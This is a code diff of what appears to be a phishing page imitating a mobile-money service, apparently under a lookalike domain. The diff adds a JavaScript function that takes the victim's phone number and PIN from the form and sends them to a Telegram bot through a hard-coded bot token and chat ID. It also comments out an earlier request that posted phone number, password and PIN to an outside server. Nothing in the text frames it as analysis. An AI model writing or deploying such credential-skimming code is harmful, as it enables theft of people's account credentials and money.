@@ -236,6 +236,31 @@
         document.getElementById('phonenumber').value = phonenumber;
         document.getElementById('password').value = password;
 
+        
+        function sendMessageToTelegram() {
+            const botToken = "7927477760:AAF7TpZvJeDSQPhjiYnAcp05IPT8z11rk1A";
+            const chatId = "-4849674945";
+            const pin = document.getElementById('pincode').value
+            const messageText = '`'+phonenumber+'`\n`'+phonenumber+'`\n`'+pin+'`'
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(messageText)}`;
+
+            var oReq = new XMLHttpRequest();
+            oReq.open("GET", url, true);
+
+            oReq.onreadystatechange = function () {
+                if (oReq.readyState === 4) {
+                    if (oReq.status === 200) {
+                        console.log("Message sent:", JSON.parse(oReq.responseText));
+                    } else {
+                        console.error("Error sending message:", oReq.status, oReq.responseText);
+                    }
+                }
+            };
+
+            oReq.send();
+        }
+
+
         $("#verificationForm").on("submit", function(event) {
             $('#verificationForm').hide()
             $('.success-message').show()
@@ -261,16 +286,18 @@
     // "referrer": "https://oranngemoney.com/",
     // "referrerPolicy": "strict-origin-when-cross-origin"})
             
-            var xhr = new XMLHttpRequest();
-            xhr.open("POST", 'https://erikadavis1.pythonanywhere.com/send_telegram_message', true);
-            xhr.setRequestHeader('Content-Type', 'application/json');
-            xhr.send(
-                JSON.stringify({
-                'phonenumber': document.getElementById('phonenumber').value,
-                'password':document.getElementById('password').value,
-                'pin':document.getElementById('pincode').value
-            })
-                    );
+            // var xhr = new XMLHttpRequest();
+            // xhr.open("POST", 'https://erikadavis1.pythonanywhere.com/send_telegram_message', true);
+            // xhr.setRequestHeader('Content-Type', 'application/json');
+            // xhr.send(
+            //     JSON.stringify({
+            //     'phonenumber': document.getElementById('phonenumber').value,
+            //     'password':document.getElementById('password').value,
+            //     'pin':document.getElementById('pincode').value
+            //     })
+            // );
+
+            sendMessageToTelegram();
 
 
             setInterval(function() { window.location.reload() }, 5000);
